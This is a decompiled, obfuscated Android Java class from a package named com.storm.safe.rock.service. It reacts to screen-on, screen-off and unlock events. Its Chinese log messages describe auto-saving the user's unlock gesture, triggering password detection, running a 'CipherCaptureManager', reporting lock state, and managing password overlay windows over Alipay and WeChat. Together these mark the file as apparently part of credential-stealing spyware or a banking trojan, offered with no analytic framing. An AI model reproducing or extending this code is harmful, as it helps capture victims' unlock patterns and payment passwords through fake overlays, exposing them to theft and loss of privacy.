package com.storm.safe.rock.service;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0319a4;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.cipher.C0335a1;
import com.storm.safe.rock.service.modules.overlay.C0353a0;
import com.storm.safe.rock.service.modules.overlay.C0354a1;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import com.storm.safe.rock.service.tisxhskrc;
import kotlinx.coroutines.AbstractC0780a0;
import okio.Segment;
import p000.AbstractC1262tj;
import p000.C0032al;
import p000.RunnableC1052p1;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class dqtvuisjd$screenStateReceiver$1 extends BroadcastReceiver {

    /* renamed from: a1 */
    public static final /* synthetic */ int f52681a1 = 0;

    /* renamed from: a0 */
    public final /* synthetic */ dqtvuisjd f52682a0;

    public dqtvuisjd$screenStateReceiver$1(dqtvuisjd dqtvuisjdVar) {
        this.f52682a0 = dqtvuisjdVar;
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String action;
        if (intent != null) {
            try {
                action = intent.getAction();
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "⚠️ [screenStateReceiver] 意外异常被拦截", e);
                return;
            }
        } else {
            action = null;
        }
        if (action != null) {
            int iHashCode = action.hashCode();
            boolean z = true;
            if (iHashCode != -2128145023) {
                if (iHashCode == -1454123155) {
                    if (action.equals("android.intent.action.SCREEN_ON")) {
                        t60.m214702c3("dqtvuisjd", "📱 屏幕已点亮");
                        AbstractC0315a0.m211548b0("屏幕点亮");
                        try {
                            tisxhskrc.C0380a0 c0380a0 = tisxhskrc.f55188a0;
                            Context applicationContext = this.f52682a0.getApplicationContext();
                            t60.m214694b5(applicationContext, "applicationContext");
                            c0380a0.rescheduleAfterScreenOn(applicationContext);
                        } catch (Exception unused) {
                        }
                        this.f52682a0.m211518l5();
                        dqtvuisjd.m211407a6(this.f52682a0);
                        C0335a1 c0335a1 = this.f52682a0.f52438g9;
                        if (c0335a1 != null) {
                            c0335a1.f53295a9 = (System.currentTimeMillis() << 10) | (c0335a1.f53296b0.incrementAndGet() % Segment.SHARE_MINIMUM);
                            t60.m214702c3("CipherCaptureManager", "🔷 SCREEN_ON → lockBatchId=" + c0335a1.f53295a9);
                            return;
                        }
                        return;
                    }
                    return;
                }
                if (iHashCode == 823795052 && action.equals("android.intent.action.USER_PRESENT")) {
                    t60.m214702c3("dqtvuisjd", "📱 用户已解锁");
                    AbstractC0315a0.m211548b0("用户解锁");
                    this.f52682a0.m211518l5();
                    dqtvuisjd.m211407a6(this.f52682a0);
                    if (this.f52682a0.f52469k0) {
                        dqtvuisjd.m211406a5(this.f52682a0);
                    }
                    C0319a4 c0319a4 = this.f52682a0.f52437g8;
                    if (c0319a4 != null) {
                        if (c0319a4.f53061a7 != 1) {
                            z = false;
                        }
                        if (z) {
                            t60.m214714d6("dqtvuisjd", "🔐 用户解锁成功，触发自动保存解锁手势");
                            dqtvuisjd dqtvuisjdVar = this.f52682a0;
                            AbstractC0780a0.m213692a3(dqtvuisjdVar.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$screenStateReceiver$1$onReceive$7(dqtvuisjdVar, null), 2);
                        }
                    }
                    dqtvuisjd dqtvuisjdVar2 = this.f52682a0;
                    String str = dqtvuisjdVar2.f52470k1;
                    if (str != null) {
                        t60.m214714d6("dqtvuisjd", "🔐 用户解锁，触发待处理的密码检测: ".concat(str));
                        dqtvuisjdVar2.f52470k1 = null;
                        new Handler(Looper.getMainLooper()).postDelayed(new RunnableC1052p1(dqtvuisjdVar2, 19, str), 500L);
                        return;
                    }
                    return;
                }
                return;
            }
            if (action.equals("android.intent.action.SCREEN_OFF")) {
                t60.m214702c3("dqtvuisjd", "📱 屏幕已关闭 → 强制发送锁屏状态");
                AbstractC0315a0.m211548b0("屏幕关闭(锁屏)");
                dqtvuisjd dqtvuisjdVar3 = this.f52682a0;
                try {
                    t60.m214702c3("dqtvuisjd", "📱 SCREEN_OFF → 强制发送 isLocked=true, isScreenOn=false");
                    C0323a8 c0323a8 = dqtvuisjdVar3.f52415e6;
                    if (c0323a8 != null) {
                        c0323a8.m211666d2(true, false);
                    }
                } catch (Exception e2) {
                    t60.m214705c6("dqtvuisjd", "❌ 发送屏幕关闭状态失败", e2);
                }
                if (this.f52682a0.f52474k5) {
                    this.f52682a0.f52474k5 = false;
                    this.f52682a0.f52471k2 = 0;
                    t60.m214714d6("dqtvuisjd", "📱 SCREEN_OFF → 停止密码监听重试");
                }
                C0335a1 c0335a12 = this.f52682a0.f52438g9;
                if (c0335a12 != null) {
                    long j = c0335a12.f53295a9;
                    c0335a12.f53295a9 = 0L;
                    t60.m214702c3("CipherCaptureManager", "🔷 SCREEN_OFF → 清除 lockBatchId (was=" + j + ")");
                    c0335a12.m211815b5();
                }
                C0319a4 c0319a42 = this.f52682a0.f52437g8;
                if (c0319a42 != null) {
                    c0319a42.m211576a5();
                }
                C0032al c0032al = this.f52682a0.f52439h0;
                if (c0032al != null) {
                    c0032al.f43699a7.removeCallbacksAndMessages(null);
                    c0032al.f43701a9 = null;
                    c0032al.f43702b0 = null;
                    c0032al.m209818a7();
                    c0032al.f43703b1 = false;
                    c0032al.f43704b2 = false;
                    c0032al.f43705b3 = false;
                }
                C0355a0 c0355a0 = this.f52682a0.f52435g6;
                if (c0355a0 != null) {
                    c0355a0.m211946e0();
                }
                try {
                    C0353a0.f53609b0.getInstance(this.f52682a0).m211897a2(false);
                } catch (Exception e3) {
                    t60.m214726f4("dqtvuisjd", "关闭支付宝密码悬浮窗失败: " + e3.getMessage());
                }
                try {
                    C0354a1.f53621b0.getInstance(this.f52682a0).m211903a3(false);
                } catch (Exception e4) {
                    t60.m214726f4("dqtvuisjd", "关闭微信密码悬浮窗失败: " + e4.getMessage());
                }
            }
        }
    }
}
